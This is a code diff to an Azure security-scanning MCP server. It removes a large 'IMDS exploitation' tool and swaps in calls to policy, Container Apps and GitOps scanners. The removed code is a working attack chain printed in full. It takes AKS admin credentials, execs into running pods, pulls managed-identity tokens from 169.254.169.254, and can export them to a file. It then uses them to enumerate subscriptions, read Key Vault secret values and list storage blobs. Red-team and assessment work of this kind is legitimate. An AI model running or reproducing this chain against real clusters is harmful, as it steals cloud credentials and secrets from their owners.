-          output += '\n';
-
-          output += `---\n\n`;
-          output += `## 📊 Live Scan Summary\n\n`;
-          output += `| Severity | Count |\n|----------|-------|\n`;
-          output += `| 🔴 CRITICAL | ${criticalCount} |\n`;
-          output += `| 🟠 HIGH | ${highCount} |\n`;
-          output += `| 🟡 MEDIUM | ${mediumCount} |\n`;
-          output += `| 🟢 LOW | ${lowCount} |\n`;
-          output += `| **TOTAL** | **${findings.length}** |\n\n`;
-
-          if (findings.length > 0) {
-            output += `### 🚨 All Findings\n\n`;
-            output += `| # | Severity | Category | Finding | Details |\n|---|----------|----------|---------|----------|\n`;
-            let i = 1;
-            for (const f of findings) {
-              const icon = f.severity === 'CRITICAL' ? '🔴' : f.severity === 'HIGH' ? '🟠' : f.severity === 'MEDIUM' ? '🟡' : '🟢';
-              output += `| ${i++} | ${icon} ${f.severity} | ${f.category} | ${f.finding} | ${f.details} |\n`;
-            }
-            output += '\n';
-          }
-
-          const riskScore = (criticalCount * 40) + (highCount * 20) + (mediumCount * 5) + (lowCount * 1);
-          let riskLevel = 'LOW';
-          let riskEmoji = '🟢';
-          if (riskScore >= 100) { riskLevel = 'CRITICAL'; riskEmoji = '🔴'; }
-          else if (riskScore >= 50) { riskLevel = 'HIGH'; riskEmoji = '🟠'; }
-          else if (riskScore >= 20) { riskLevel = 'MEDIUM'; riskEmoji = '🟡'; }
-          
-          output += `### Risk Assessment\n\n`;
-          output += `**Risk Score:** ${riskScore}\n`;
-          output += `**Risk Level:** ${riskEmoji} **${riskLevel}**\n`;
-          output += `**Scan Mode:** kubectl CLI (30s timeout per command)\n\n`;
-
-          output += `---\n\n`;
-          output += `*Generated by Stratos MCP v1.9.8 - Comprehensive K8s Security Assessment (20 checks)*\n`;
-
-          // Cleanup temp kubeconfig
-          try {
-            await fs.unlink(tempKubeconfig);
-          } catch (cleanupErr) {
-            // Ignore cleanup errors
-          }
-
-          return {
-            content: [{ type: 'text', text: formatResponse(output, format, request.params.name) }],
-          };
-        } catch (error: any) {
-          return {
-            content: [{ type: 'text', text: `Error running live AKS scan: ${error.message}` }],
-            isError: true,
-          };
-        }
-      }
-
-      case "azure_scan_aks_pod_identity": {
+      case "azure_scan_aks_policy_bypass": {
         const subscriptionId = String(request.params.arguments?.subscriptionId);
         const resourceGroup = String(request.params.arguments?.resourceGroup);
         const clusterName = String(request.params.arguments?.clusterName);
         const format = request.params.arguments?.format ? String(request.params.arguments.format) : "markdown";
         
         try {
-          const result = await scanAKSPodIdentity(subscriptionId, resourceGroup, clusterName, format);
+          const result = await scanAKSPolicyBypass(subscriptionId, resourceGroup, clusterName, format);
           performanceTracker.end(trackingId, true);
           logger.info(`Tool completed successfully: ${name}`, {}, name);
           return {
@@ -7161,714 +5907,76 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
           performanceTracker.end(trackingId, false, error.message);
           logger.error(`Tool failed: ${name}`, { error: error.message }, name);
           return {
-            content: [{type: 'text', text: `Error scanning AKS Pod Identity: ${error.message}`}],
+            content: [{type: 'text', text: `Error scanning AKS policy configurations: ${error.message}`}],
             isError: true,
           };
         }
       }
 
-      case "azure_scan_aks_imds": {
-        const { subscriptionId, resourceGroup, clusterName, namespace, exportTokens = false, deepDataPlane = false, format } = request.params.arguments as {
-          subscriptionId: string;
-          resourceGroup: string;
-          clusterName: string;
-          namespace?: string;
-          exportTokens?: boolean;
-          deepDataPlane?: boolean;
-          format?: string;
-        };
-
+      case "azure_scan_container_apps_security": {
+        const subscriptionId = String(request.params.arguments?.subscriptionId);
+        const resourceGroup = request.params.arguments?.resourceGroup ? String(request.params.arguments.resourceGroup) : undefined;
+        const containerAppName = request.params.arguments?.containerAppName ? String(request.params.arguments.containerAppName) : undefined;
+        const format = request.params.arguments?.format ? String(request.params.arguments.format) : "markdown";
+        
         try {
-          const aksClient = new ContainerServiceClient(credential, subscriptionId);
-          
-          let output = `# 🔴 IMDS EXPLOITATION & FULL RECONNAISSANCE\n\n`;
-          output += `**Attack Chain:** Existing Pod → IMDS Check → Token Theft → Full Enumeration\n`;
-          output += `**Target Cluster:** ${clusterName}\n`;
-          output += `**Resource Group:** ${resourceGroup}\n`;
-          output += `**Subscription:** ${subscriptionId}\n`;
-          output += `**Namespace Scope:** ${namespace || 'ALL'}\n`;
-          output += `**Scan Time:** ${new Date().toISOString()}\n`;
-          output += `**Scanner:** Stratos MCP v${SERVER_VERSION} (IMDS Attack Module)\n\n`;
-          output += `---\n\n`;
-
-          output += `## 🔑 Phase 0: Cluster Connection\n\n`;
-          
-          const cluster = await aksClient.managedClusters.get(resourceGroup, clusterName);
-          
-          let kubeconfig: string;
-          try {
-            const adminCreds = await aksClient.managedClusters.listClusterAdminCredentials(resourceGroup, clusterName);
-            if (!adminCreds.kubeconfigs || adminCreds.kubeconfigs.length === 0) {
-              throw new Error("No kubeconfig returned");
-            }
-            kubeconfig = Buffer.from(adminCreds.kubeconfigs[0].value!).toString('utf-8');
-            output += `✅ Admin credentials obtained\n\n`;
-          } catch (adminError: any) {
-            try {
-              const userCreds = await aksClient.managedClusters.listClusterUserCredentials(resourceGroup, clusterName);
-              if (!userCreds.kubeconfigs || userCreds.kubeconfigs.length === 0) {
-                throw new Error("No kubeconfig returned");
-              }
-              kubeconfig = Buffer.from(userCreds.kubeconfigs[0].value!).toString('utf-8');
-              output += `✅ User credentials obtained\n\n`;
-            } catch (userError: any) {
-              return {
-                content: [{
-                  type: 'text',
-                  text: `# ❌ Failed to Connect to Cluster\n\n` +
-                    `Could not obtain cluster credentials.\n\n` +
-                    `**Admin Error:** ${adminError.message}\n` +
-                    `**User Error:** ${userError.message}\n`
-                }],
-                isError: true,
-              };
-            }
-          }
-
-          // Convert kubeconfig from devicecode to azurecli auth
-          kubeconfig = kubeconfig.replace(/--login\s+devicecode/gi, '--login azurecli');
-          
-          // Save kubeconfig to temp file
-          const os = await import('os');
-          const pathMod = await import('path');
-          const fsMod = await import('fs').then(m => m.promises);
-          const tempKubeconfig = pathMod.join(os.tmpdir(), `stratos-imds-${Date.now()}.yaml`);
-          await fsMod.writeFile(tempKubeconfig, kubeconfig);
-          
-          // Validate Azure CLI session and token before running kubectl
-          output += `**Validating Azure CLI session...**\n`;
-          try {
-            const { exec } = await import('child_process');
-            // First check if account is configured
-            await new Promise<void>((resolve, reject) => {
-              exec('az account show', { timeout: 5000 }, (error, stdout, stderr) => {
-                if (error) {
-                  reject(new Error('Azure CLI not authenticated'));
-                } else {
-                  resolve();
-                }
-              });
-            });
-            
-            // Then validate token is still valid by attempting to get access token
-            await new Promise<void>((resolve, reject) => {
-              exec('az account get-access-token --resource https://management.azure.com/', { timeout: 10000 }, (error, stdout, stderr) => {
-                if (error) {
-                  // Check if it's a token expiration issue
-                  if (stderr.includes('expired') || stderr.includes('refresh') || stderr.includes('AADSTS')) {
-                    reject(new Error('Azure CLI token expired - please run: az login'));
-                  } else {
-                    reject(new Error('Azure CLI token validation failed'));
-                  }
-                } else {
-                  try {
-                    const tokenData = JSON.parse(stdout);
-                    if (!tokenData.accessToken) {
-                      reject(new Error('No valid access token available'));
-                    } else {
-                      resolve();
-                    }
-                  } catch (e) {
-                    reject(new Error('Invalid token response'));
-                  }
-                }
-              });
-            });
-            output += `✅ Azure CLI session and token valid\n\n`;
-          } catch (azError: any) {
-            try { await fsMod.unlink(tempKubeconfig); } catch (e) {}
-            return {
-              content: [{
-                type: 'text',
-                text: `# ❌ Azure CLI Authentication Required\n\n` +
-                  `The Azure CLI session has expired or token is invalid.\n\n` +
-                  `**Error:** ${azError.message}\n\n` +
-                  `## 🔧 Fix\n\n` +
-                  `Run the following command to re-authenticate:\n\n` +
-                  `\`\`\`bash\n` +
-                  `az login\n` +
-                  `\`\`\`\n\n` +
-                  `**Common Causes:**\n` +
-                  `- Token expired (Azure CLI tokens expire after some time)\n` +
-                  `- Session not refreshed (run \`az login\` periodically)\n` +
-                  `- Multi-tenant issues (use \`az login --tenant <tenant-id>\`)\n\n` +
-                  `Then try the scan again.\n\n` +
-                  `**Note:** This tool requires valid Azure CLI authentication for kubectl operations.`
-              }],
-              isError: true,
-            };
-          }
-          
-          const KUBECTL_TIMEOUT_MS = 15000;
-          
-          // Helper function to run kubectl
-          const runKubectl = async (args: string): Promise<string> => {
-            const { exec } = await import('child_process');
-            return new Promise((resolve, reject) => {
-              let killed = false;
-              const child = exec(
-                `kubectl --kubeconfig="${tempKubeconfig}" ${args}`,
-                { maxBuffer: 10 * 1024 * 1024, timeout: KUBECTL_TIMEOUT_MS },
-                (error, stdout, stderr) => {
-                  if (killed) return;
-                  if (error) {
-                    // Check for authentication-related errors
-                    const errorMsg = (stderr || error.message).toLowerCase();
-                    if (errorMsg.includes('unauthorized') || errorMsg.includes('authentication') || 
-                        errorMsg.includes('token') || errorMsg.includes('expired') ||
-                        errorMsg.includes('aadsts') || errorMsg.includes('credentials')) {
-                      reject(new Error(`Authentication failed - Azure CLI token may have expired. Run 'az login' and retry. Details: ${stderr || error.message}`));
-                    } else {
-                      reject(new Error(stderr || error.message));
-                    }
-                  } else {
-                    resolve(stdout);
-                  }
-                }
-              );
-              setTimeout(() => {
-                if (child.exitCode === null) {
-                  killed = true;
-                  child.kill('SIGTERM');
-                  reject(new Error(`kubectl timed out after ${KUBECTL_TIMEOUT_MS/1000}s`));
-                }
-              }, KUBECTL_TIMEOUT_MS + 1000);
-            });
-          };
-
-          // Track findings
-          const findings: Array<{severity: string; category: string; finding: string; details: string}> = [];
-          let criticalCount = 0, highCount = 0, mediumCount = 0, lowCount = 0;
-          let tenantId = '';
-
-          output += `## 🎯 Phase 1: Enumerate Existing Pods\n\n`;
-          output += `**Approach:** Using EXISTING running pods only (no pod creation)\n\n`;
-          
-          interface PodInfo {
-            namespace: string;
-            name: string;
-            container: string;
-            imdsExposed: boolean;
-            error?: string;
-          }
-          
-          const allPods: PodInfo[] = [];
-          const exposedPods: PodInfo[] = [];
-          
-          try {
-            const nsArg = namespace ? `-n ${namespace}` : '--all-namespaces';
-            const scopeLabel = namespace ? `namespace "${namespace}"` : 'ALL namespaces';
-            
-            const podsJson = await runKubectl(`get pods ${nsArg} -o json`);
-            const podsData = JSON.parse(podsJson);
-            const runningPods = (podsData.items || []).filter((p: any) => p.status?.phase === 'Running');
-            
-            output += `**Scope:** ${scopeLabel}\n`;
-            output += `**Running Pods Found:** ${runningPods.length}\n\n`;
-            
-            if (runningPods.length === 0) {
-              output += `❌ No running pods found to test IMDS access\n\n`;
-              try { await fsMod.unlink(tempKubeconfig); } catch (e) {}
-              return { content: [{ type: 'text', text: formatResponse(output, format, request.params.name) }] };
-            }
-            
-            // Limit scan to first 30 pods for performance
-            const podsToScan = runningPods.slice(0, 30);
-            
-            output += `Scanning ${podsToScan.length} pods for IMDS reachability...\n\n`;
-            output += `| # | Namespace | Pod | Container | IMDS Status |\n|---|-----------|-----|-----------|-------------|\n`;
-            
-            let podNum = 0;
-            for (const pod of podsToScan) {
-              podNum++;
-              const ns = pod.metadata?.namespace || 'default';
-              const podName = pod.metadata?.name || 'unknown';
-              const container = pod.spec?.containers?.[0]?.name || '';
-              
-              const podInfo: PodInfo = {
-                namespace: ns,
-                name: podName,
-                container: container,
-                imdsExposed: false
-              };
-              
-              try {
-                const containerArg = container ? `-c ${container}` : '';
-                // Quick IMDS check with short timeout
-                const imdsTest = await runKubectl(`exec -n ${ns} ${podName} ${containerArg} -- sh -c 'wget -qO- --timeout=2 --header="Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | head -50'`);
-                
-                const isExposed = imdsTest.includes('compute') || imdsTest.includes('vmId') || imdsTest.includes('subscriptionId');
-                podInfo.imdsExposed = isExposed;
-                
-                if (isExposed) {
-                  exposedPods.push(podInfo);
-                  output += `| ${podNum} | ${ns} | ${podName} | ${container || 'default'} | 🔴 **EXPOSED** |\n`;
-                } else {
-                  output += `| ${podNum} | ${ns} | ${podName} | ${container || 'default'} | ✅ Blocked |\n`;
-                }
-              } catch (e: any) {
-                podInfo.error = e.message;
-                output += `| ${podNum} | ${ns} | ${podName} | ${container || 'default'} | ✅ Blocked (timeout) |\n`;
-              }
-              
-              allPods.push(podInfo);
-            }
-            
-            if (runningPods.length > 30) {
-              output += `| ... | (${runningPods.length - 30} more pods not scanned) | ... | ... | ... |\n`;
-            }
-            output += `\n`;
-            
-            output += `### IMDS Exposure Summary\n\n`;
-            output += `| Metric | Value |\n|--------|-------|\n`;
-            output += `| Total Pods Scanned | ${allPods.length} |\n`;
-            output += `| 🔴 EXPOSED to IMDS | ${exposedPods.length} (${((exposedPods.length/allPods.length)*100).toFixed(1)}%) |\n`;
-            output += `| ✅ Protected | ${allPods.length - exposedPods.length} (${(((allPods.length - exposedPods.length)/allPods.length)*100).toFixed(1)}%) |\n\n`;
-            
-            if (exposedPods.length === 0) {
-              output += `## ✅ All Pods Protected from IMDS\n\n`;
-              output += `No pods can reach the IMDS endpoint (169.254.169.254).\n`;
-              output += `This is the expected secure configuration.\n\n`;
-              
-              findings.push({
-                severity: 'LOW',
-                category: 'IMDS',
-                finding: 'All pods protected from IMDS access',
-                details: `${allPods.length} pods verified blocked`
-              });
-              lowCount++;
-              
-              // Cleanup and return
-              try { await fsMod.unlink(tempKubeconfig); } catch (e) {}
-              return { content: [{ type: 'text', text: formatResponse(output, format, request.params.name) }] };
-            }
-            
-            findings.push({
-              severity: 'CRITICAL',
-              category: 'IMDS Exposure',
-              finding: `${exposedPods.length} pods can reach IMDS`,
-              details: exposedPods.slice(0, 5).map(p => `${p.namespace}/${p.name}`).join(', ')
-            });
-            criticalCount++;
-            
-          } catch (e: any) {
-            output += `❌ Failed to enumerate pods: ${e.message}\n\n`;
-            try { await fsMod.unlink(tempKubeconfig); } catch (e) {}
-            return { content: [{ type: 'text', text: formatResponse(output, format, request.params.name) }] };
-          }
-
-          output += `## 💀 Phase 2: Token Theft from Vulnerable Pod\n\n`;
-          
-          // Use first exposed pod for token theft
-          const targetPod = exposedPods[0];
-          output += `**Selected Pod:** \`${targetPod.namespace}/${targetPod.name}\`\n`;
-          output += `**Container:** \`${targetPod.container || 'default'}\`\n\n`;
-          
-          // Helper to execute command in target pod
-          const execInPod = async (cmd: string): Promise<string> => {
-            const containerArg = targetPod.container ? `-c ${targetPod.container}` : '';
-            return await runKubectl(`exec -n ${targetPod.namespace} ${targetPod.name} ${containerArg} -- sh -c '${cmd}'`);
-          };
-
-          try {
-            const identityInfo = await execInPod(`wget -qO- --header="Metadata:true" "http://169.254.169.254/metadata/identity/info?api-version=2018-02-01" 2>&1`);
-            if (identityInfo.includes('tenantId')) {
-              const tenantMatch = identityInfo.match(/"tenantId"\s*:\s*"([^"]+)"/);
-              tenantId = tenantMatch ? tenantMatch[1] : '';
-              output += `**Tenant ID:** \`${tenantId}\`\n\n`;
-            }
-          } catch (e: any) {}
-
-          // Steal tokens for multiple resources
-          output += `Stealing tokens for multiple Azure resources...\n\n`;
-          
-          interface StolenToken {
-            resource: string;
-            resourceName: string;
-            clientId: string;
-            accessToken: string;
-            expiresOn: string;
-          }
-          
-          const stolenTokens: StolenToken[] = [];
-          const resources = [
-            { name: 'ARM (Azure Management)', resource: 'https://management.azure.com/' },
-            { name: 'Key Vault', resource: 'https://vault.azure.net/' },
-            { name: 'Storage', resource: 'https://storage.azure.com/' },
-            { name: 'Graph API', resource: 'https://graph.microsoft.com/' },
-          ];
-          
-          output += `| Resource | Status | Client ID | Expires |\n|----------|--------|-----------|----------|\n`;
-          
-          for (const res of resources) {
-            try {
-              const tokenResp = await execInPod(`wget -qO- --header="Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=${encodeURIComponent(res.resource)}" 2>&1`);
-              
-              if (tokenResp.includes('access_token')) {
-                const tokenData = JSON.parse(tokenResp);
-                const clientId = tokenData.client_id || 'unknown';
-                const expiresOn = new Date(parseInt(tokenData.expires_on) * 1000).toISOString();
-                const accessToken = tokenData.access_token;
-                
-                stolenTokens.push({
-                  resource: res.resource,
-                  resourceName: res.name,
-                  clientId,
-                  accessToken,
-                  expiresOn
-                });
-                
-                output += `| ${res.name} | ✅ STOLEN | \`${clientId.substring(0, 8)}...\` | ${expiresOn.split('T')[0]} |\n`;
-                
-                findings.push({
-                  severity: 'CRITICAL',
-                  category: 'Token Theft',
-                  finding: `${res.name} token stolen via IMDS`,
-                  details: `Client ID: ${clientId}`
-                });
-                criticalCount++;
-              } else {
-                output += `| ${res.name} | ❌ Failed | - | - |\n`;
-              }
-            } catch (e: any) {
-              output += `| ${res.name} | ❌ Error | - | ${e.message.substring(0, 20)}... |\n`;
-            }
-          }
-          output += `\n`;
-
-          if (stolenTokens.length === 0) {
-            output += `⚠️ No tokens could be stolen - identity may not be configured\n\n`;
-            try { await fsMod.unlink(tempKubeconfig); } catch (e) {}
-            return { content: [{ type: 'text', text: formatResponse(output, format, request.params.name) }] };
-          }
-
-          if (exportTokens && stolenTokens.length > 0) {
-            output += `### 💾 Token Export\n\n`;
-            
-            const tokenExportPath = pathMod.join(os.tmpdir(), `stratos-tokens-${Date.now()}.json`);
-            const tokenExportData = {
-              exportTime: new Date().toISOString(),
-              cluster: clusterName,
-              subscription: subscriptionId,
-              tenantId: tenantId,
-              sourcePod: `${targetPod.namespace}/${targetPod.name}`,
-              tokens: stolenTokens.map(t => ({
-                resource: t.resource,
-                clientId: t.clientId,
-                expiresOn: t.expiresOn,
-                accessToken: t.accessToken
-              }))
-            };
-            
-            try {
-              await fsMod.writeFile(tokenExportPath, JSON.stringify(tokenExportData, null, 2));
-              output += `✅ **Tokens exported to:** \`${tokenExportPath}\`\n\n`;
-              
-              findings.push({
-                severity: 'HIGH',
-                category: 'Token Export',
-                finding: `${stolenTokens.length} tokens exported`,
-                details: tokenExportPath
-              });
-              highCount++;
-            } catch (e: any) {
-              output += `⚠️ Export failed: ${e.message}\n\n`;
-            }
-          }
-
-          const armToken = stolenTokens.find(t => t.resource.includes('management.azure.com'))?.accessToken;
-          
-          if (!armToken) {
-            output += `⚠️ No ARM token obtained - cannot enumerate Azure resources\n\n`;
-            try { await fsMod.unlink(tempKubeconfig); } catch (e) {}
-            return { content: [{ type: 'text', text: formatResponse(output, format, request.params.name) }] };
-          }
-
-          output += `## 📋 Phase 3: Token Permission Enumeration\n\n`;
-          output += `Using stolen ARM token to discover accessible resources...\n\n`;
-
-          // Subscriptions
-          output += `### Accessible Subscriptions\n\n`;
-          let accessibleSubs: any[] = [];
-          try {
-            const subsResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${armToken}" "https://management.azure.com/subscriptions?api-version=2022-12-01" 2>&1`);
-            
-            if (subsResp.includes('"value"')) {
-              const subsData = JSON.parse(subsResp);
-              accessibleSubs = subsData.value || [];
-              
-              output += `| Subscription ID | Name | State |\n|-----------------|------|-------|\n`;
-              for (const sub of accessibleSubs) {
-                output += `| \`${sub.subscriptionId}\` | ${sub.displayName} | ${sub.state} |\n`;
-              }
-              output += `\n`;
-              
-              if (accessibleSubs.length > 0) {
-                findings.push({
-                  severity: 'HIGH',
-                  category: 'Subscriptions',
-                  finding: `${accessibleSubs.length} subscription(s) accessible`,
-                  details: accessibleSubs.map((s: any) => s.displayName).join(', ')
-                });
-                highCount++;
-              }
-            } else {
-              output += `No subscriptions accessible\n\n`;
-            }
-          } catch (e: any) {
-            output += `⚠️ Subscription enum failed: ${e.message}\n\n`;
-          }
-
-          // Resource Groups
-          output += `### Accessible Resource Groups\n\n`;
-          let resourceGroups: string[] = [];
-          try {
-            const rgResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${armToken}" "https://management.azure.com/subscriptions/${subscriptionId}/resourcegroups?api-version=2021-04-01" 2>&1`);
-            
-            if (rgResp.includes('"value"')) {
-              const rgData = JSON.parse(rgResp);
-              resourceGroups = (rgData.value || []).map((rg: any) => rg.name);
-              
-              output += `| Resource Group | Location |\n|----------------|----------|\n`;
-              for (const rg of rgData.value?.slice(0, 10) || []) {
-                output += `| ${rg.name} | ${rg.location} |\n`;
-              }
-              if (resourceGroups.length > 10) {
-                output += `| ... | (${resourceGroups.length - 10} more) |\n`;
-              }
-              output += `\n`;
-              
-              findings.push({
-                severity: 'HIGH',
-                category: 'Resource Groups',
-                finding: `${resourceGroups.length} resource group(s) accessible`,
-                details: resourceGroups.slice(0, 5).join(', ')
-              });
-              highCount++;
-            }
-          } catch (e: any) {
-            output += `⚠️ Resource group enum failed: ${e.message}\n\n`;
-          }
-
-          // Key Resources
-          output += `### Key Azure Resources\n\n`;
-          output += `| Resource Type | Count | Examples |\n|---------------|-------|----------|\n`;
-          
-          const resourceTypes = [
-            { type: 'Microsoft.Storage/storageAccounts', name: 'Storage Accounts', icon: '📦' },
-            { type: 'Microsoft.KeyVault/vaults', name: 'Key Vaults', icon: '🔐' },
-            { type: 'Microsoft.ContainerRegistry/registries', name: 'Container Registries', icon: '🐳' },
-            { type: 'Microsoft.Sql/servers', name: 'SQL Servers', icon: '🗄️' },
-            { type: 'Microsoft.Compute/virtualMachines', name: 'Virtual Machines', icon: '💻' },
-          ];
-          
-          for (const rt of resourceTypes) {
-            try {
-              const resResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${armToken}" "https://management.azure.com/subscriptions/${subscriptionId}/providers/${rt.type}?api-version=2023-01-01" 2>&1`);
-              
-              if (resResp.includes('"value"')) {
-                const resData = JSON.parse(resResp);
-                const resources = resData.value || [];
-                const examples = resources.slice(0, 3).map((r: any) => r.name);
-                
-                output += `| ${rt.icon} ${rt.name} | **${resources.length}** | ${examples.join(', ') || '-'} |\n`;
-                
-                if (resources.length > 0) {
-                  findings.push({
-                    severity: 'MEDIUM',
-                    category: rt.name,
-                    finding: `${resources.length} ${rt.name.toLowerCase()} accessible`,
-                    details: examples.join(', ')
-                  });
-                  mediumCount++;
-                }
-              } else {
-                output += `| ${rt.icon} ${rt.name} | 0 | - |\n`;
-              }
-            } catch (e: any) {
-              output += `| ${rt.icon} ${rt.name} | ❌ | Error |\n`;
-            }
-          }
-          output += `\n`;
-
-          output += `## 🔓 Phase 4: Data Plane Access Testing\n\n`;
-
-          // Key Vault secrets
-          const kvToken = stolenTokens.find(t => t.resource.includes('vault.azure.net'))?.accessToken;
-          if (kvToken) {
-            output += `### 🔐 Key Vault Secrets\n\n`;
-            
-            try {
-              const kvResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${armToken}" "https://management.azure.com/subscriptions/${subscriptionId}/providers/Microsoft.KeyVault/vaults?api-version=2023-02-01" 2>&1`);
-              
-              if (kvResp.includes('"value"')) {
-                const kvData = JSON.parse(kvResp);
-                const keyVaults = kvData.value || [];
-                
-                output += `| Key Vault | Secrets | Status |\n|-----------|---------|--------|\n`;
-                
-                for (const kv of keyVaults.slice(0, 5)) {
-                  const kvName = kv.name;
-                  const kvUri = kv.properties?.vaultUri || `https://${kvName}.vault.azure.net/`;
-                  
-                  try {
-                    const secretsResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${kvToken}" "${kvUri}secrets?api-version=7.4" 2>&1`);
-                    
-                    if (secretsResp.includes('"value"')) {
-                      const secretsData = JSON.parse(secretsResp);
-                      const secrets = secretsData.value || [];
-                      
-                      output += `| ${kvName} | ${secrets.length} | ✅ Accessible |\n`;
-                      
-                      if (secrets.length > 0) {
-                        findings.push({
-                          severity: 'CRITICAL',
-                          category: 'Key Vault',
-                          finding: `${secrets.length} secrets accessible in ${kvName}`,
-                          details: 'Can read secret values'
-                        });
-                        criticalCount++;
-                        
-                        // Deep read secret values if enabled
-                        if (deepDataPlane) {
-                          output += `\n**Secret Values from ${kvName}:**\n\n`;
-                          output += `| Secret Name | Value (truncated) | Type |\n|-------------|-------------------|------|\n`;
-                          
-                          for (const secret of secrets.slice(0, 5)) {
-                            const secretId = secret.id || '';
-                            const secretName = secretId.split('/secrets/')[1]?.split('/')[0] || 'unknown';
-                            
-                            try {
-                              const valueResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${kvToken}" "${kvUri}secrets/${secretName}?api-version=7.4" 2>&1`);
-                              
-                              if (valueResp.includes('"value"')) {
-                                const valueData = JSON.parse(valueResp);
-                                const value = valueData.value || '';
-                                const displayValue = value.substring(0, 20) + (value.length > 20 ? '...' : '');
-                                
-                                let secretType = 'unknown';
-                                if (value.includes('-----BEGIN')) secretType = '🔑 CERT/KEY';
-                                else if (value.match(/^[A-Za-z0-9+/=]{40,}$/)) secretType = '🔐 TOKEN';
-                                else if (value.includes('DefaultEndpointsProtocol')) secretType = '📦 CONN STR';
-                                else secretType = '📝 TEXT';
-                                
-                                output += `| \`${secretName}\` | \`${displayValue}\` | ${secretType} |\n`;
-                              }
-                            } catch (e) {
-                              output += `| \`${secretName}\` | ❌ Access denied | - |\n`;
-                            }
-                          }
-                          output += `\n`;
-                        }
-                      }
-                    } else {
-                      output += `| ${kvName} | - | ❌ Access denied |\n`;
-                    }
-                  } catch (e) {
-                    output += `| ${kvName} | - | ❌ Error |\n`;
-                  }
-                }
-                output += `\n`;
-              }
-            } catch (e: any) {
-              output += `⚠️ Key Vault enum failed: ${e.message}\n\n`;
-            }
-          }
-
-          // Storage blobs
-          const storageToken = stolenTokens.find(t => t.resource.includes('storage.azure.com'))?.accessToken;
-          if (storageToken) {
-            output += `### 📦 Storage Account Access\n\n`;
-            
-            try {
-              const saResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${armToken}" "https://management.azure.com/subscriptions/${subscriptionId}/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01" 2>&1`);
-              
-              if (saResp.includes('"value"')) {
-                const saData = JSON.parse(saResp);
-                const storageAccounts = saData.value || [];
-                
-                output += `| Storage Account | Containers | Status |\n|-----------------|------------|--------|\n`;
-                
-                for (const sa of storageAccounts.slice(0, 5)) {
-                  const saName = sa.name;
-                  
-                  try {
-                    const blobResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${storageToken}" --header="x-ms-version: 2021-06-08" "https://${saName}.blob.core.windows.net/?comp=list" 2>&1`);
-                    
-                    if (blobResp.includes('Container')) {
-                      const containerMatches = blobResp.match(/<Name>([^<]+)<\/Name>/g) || [];
-                      const containerCount = containerMatches.length;
-                      
-                      output += `| ${saName} | ${containerCount} | ✅ Accessible |\n`;
-                      
-                      if (containerCount > 0) {
-                        findings.push({
-                          severity: 'HIGH',
-                          category: 'Storage',
-                          finding: `${containerCount} containers accessible in ${saName}`,
-                          details: 'Blob access confirmed'
-                        });
-                        highCount++;
-                      }
-                    } else {
-                      output += `| ${saName} | - | ❌ Access denied |\n`;
-                    }
-                  } catch (e) {
-                    output += `| ${saName} | - | ❌ Error |\n`;
-                  }
-                }
-                output += `\n`;
-              }
-            } catch (e: any) {
-              output += `⚠️ Storage enum failed: ${e.message}\n\n`;
-            }
-          }
-
-          output += `---\n\n`;
-          output += `## 📊 Attack Summary\n\n`;
-          
-          output += `### MITRE ATT&CK Techniques\n\n`;
-          output += `| Technique | ID | Status |\n|-----------|-----|--------|\n`;
-          output += `| Cloud Instance Metadata API | T1552.005 | ✅ Exploited |\n`;
-          output += `| Valid Accounts: Cloud | T1078.004 | ✅ Token Theft |\n`;
-          output += `| Steal Application Access Token | T1528 | ✅ ${stolenTokens.length} tokens |\n`;
-          output += `| Data from Cloud Storage | T1530 | ${findings.some(f => f.category === 'Storage') ? '✅ Accessible' : '❌ Blocked'} |\n\n`;
-
-          output += `### Findings Summary\n\n`;
-          output += `| Severity | Count |\n|----------|-------|\n`;
-          output += `| 🔴 CRITICAL | ${criticalCount} |\n`;
-          output += `| 🟠 HIGH | ${highCount} |\n`;
-          output += `| 🟡 MEDIUM | ${mediumCount} |\n`;
-          output += `| 🟢 LOW | ${lowCount} |\n`;
-          output += `| **TOTAL** | **${findings.length}** |\n\n`;
-
-          // Risk score
-          const riskScore = (criticalCount * 40) + (highCount * 20) + (mediumCount * 5) + (lowCount * 1);
-          let riskLevel = 'LOW';
-          let riskEmoji = '🟢';
-          if (riskScore >= 100) { riskLevel = 'CRITICAL'; riskEmoji = '🔴'; }
-          else if (riskScore >= 50) { riskLevel = 'HIGH'; riskEmoji = '🟠'; }
-          else if (riskScore >= 20) { riskLevel = 'MEDIUM'; riskEmoji = '🟡'; }
-          
-          output += `**Risk Score:** ${riskScore} | **Risk Level:** ${riskEmoji} **${riskLevel}**\n\n`;
-
-          // Remediation
-          output += `## 🛡️ Remediation\n\n`;
-          output += `1. **Block IMDS Access** - Apply NetworkPolicy to affected namespaces\n`;
-          output += `2. **Enable Workload Identity** - \`az aks update -g ${resourceGroup} -n ${clusterName} --enable-workload-identity\`\n`;
-          output += `3. **Reduce Identity Permissions** - Review kubelet managed identity RBAC\n\n`;
-
-          output += `---\n*Generated by Stratos MCP v${SERVER_VERSION} - IMDS Exploitation*\n`;
-
-          // Cleanup
-          try { await fsMod.unlink(tempKubeconfig); } catch (e) {}
-
+          const result = await scanContainerAppsSecurity(subscriptionId, resourceGroup, containerAppName, format);
+          performanceTracker.end(trackingId, true);
+          logger.info(`Tool completed successfully: ${name}`, {}, name);
           return {
-            content: [{ type: 'text', text: formatResponse(output, format, request.params.name) }],
+            content: [{ type: "text", text: result }],
           };
         } catch (error: any) {
+          performanceTracker.end(trackingId, false, error.message);
+          logger.error(`Tool failed: ${name}`, { error: error.message }, name);
           return {
-            content: [{ type: 'text', text: `Error running IMDS scan: ${error.message}` }],
+            content: [{ type: 'text', text: `Error scanning Container Apps: ${error.message}` }],
+            isError: true,
+          };
+        }
+      }
+
+      case "azure_scan_gitops_security": {
+        const subscriptionId = String(request.params.arguments?.subscriptionId);
+        const resourceGroup = String(request.params.arguments?.resourceGroup);
+        const clusterName = String(request.params.arguments?.clusterName);
